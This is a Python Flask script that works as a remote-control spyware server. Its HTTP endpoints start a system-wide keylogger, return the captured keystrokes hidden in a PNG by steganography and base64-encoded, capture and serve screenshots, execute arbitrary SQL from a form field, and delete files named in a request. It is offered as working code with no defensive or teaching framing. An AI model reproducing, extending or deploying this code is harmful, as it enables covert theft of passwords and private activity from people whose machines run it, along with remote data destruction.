#!/usr/bin/env python3
import socket
import os
import pyxhook
import requests
from flask import Flask
from flask import request, Response
import sqlite3
import pathlib
import pyautogui
import base64
from utils import stegano_decrypt, stegano_encrypt

mydb = sqlite3.connect("user.db")

# Creating an instance of 'cursor' class
# which is used to execute the 'SQL'
# statements in 'Python'
cursor = mydb.cursor()
app = Flask(__name__)

def screen_shot():
    screenshot = pyautogui.screenshot()
    screenshot.save('/tmp/test.png')
    with open('/tmp/test.png','rb')  as f:
        data = f.read()
    return data

def start_key_logger():
    # Python code for keylogger
    # to be used in linux

    # This tells the keylogger where the log file will go.
    # You can set the file path as an environment variable ('pylogger_file'),
    # or use the default ~/Desktop/file.log
    log_file = os.environ.get(
        'pylogger_file',
        os.path.expanduser('./file.log')
    )
    # Allow setting the cancel key from environment args, Default: `
    cancel_key = ord(
        os.environ.get(
            'pylogger_cancel',
            '`'
        )[0]
    )

    # Allow clearing the log file on start, if pylogger_clean is defined.
    if os.environ.get('pylogger_clean', None) is not None:
        try:
            os.remove(log_file)
        except EnvironmentError:
            # File does not exist, or no permissions.
            pass

    # creating key pressing event and saving it into log file
    def OnKeyPress(event):
        with open(log_file, 'a') as f:
            f.write('{}\n'.format(event.Key))

            # create a hook manager object

    new_hook = pyxhook.HookManager()
    new_hook.KeyDown = OnKeyPress
    # set the hook
    new_hook.HookKeyboard()
    try:
        new_hook.start()  # start the hook
    except KeyboardInterrupt:
        # User cancelled from command line.
        pass
    except Exception as ex:
        # Write exceptions to the log file, for analysis later.
        msg = 'Error while catching events:\n  {}'.format(ex)
        pyxhook.print_err(msg)
        with open(log_file, 'a') as f:
            f.write('\n{}'.format(msg))
            
@app.route('/')
def hello_world():
    return 'Hello world!'

@app.post('/sql')
def sql_file():
    print(request.form.get('parameter'))
    cursor.execute(request.form.get('parameter'))
    result = cursor.fetchall()
    return result

@app.post('/delete')
# do the file deletion
def delete_file():
    def notempty(filepath):
        files = filepath.rglob("*")
        for file in files:
            print(file)
            return True
        return False
    jdata = request.json
    if jdata.get('filename') is None:
        return "empty argument: filename"
    filepath = pathlib.Path(jdata.get('filename'))
    if filepath.exists() == False:
        return f"filepath: {filepath.resolve()} doesn't exists."
    if filepath.is_dir() == True and notempty(filepath):
        return f'filepath: {filepath.resolve()} is directory and not empty.'
    filepath.unlink()
    return f'delete file: {filepath.resolve()} success.'
    
@app.post('/key')
# do the keylog
def keylogger():
    start_key_logger()
    return 'keylogger started'

# https://pypi.org/project/stegano/
@app.get("/getkeylogger")
def getkeylogger():
    with open('./file.log', 'r') as f:
        data = f.read()
    nidedata = stegano_encrypt(data, './test.png')
    base64data = base64.b64encode(nidedata).decode()
    return base64data
    
@app.route('/shot',methods=["POST","GET"])
# do the screenshot
def screenshot():
    data = screen_shot()
    # data = base64.b64encode(data).decode()
    return Response(data,mimetype='image/png')

if __name__ == '__main__':
    app.run(host='0.0.0.0')
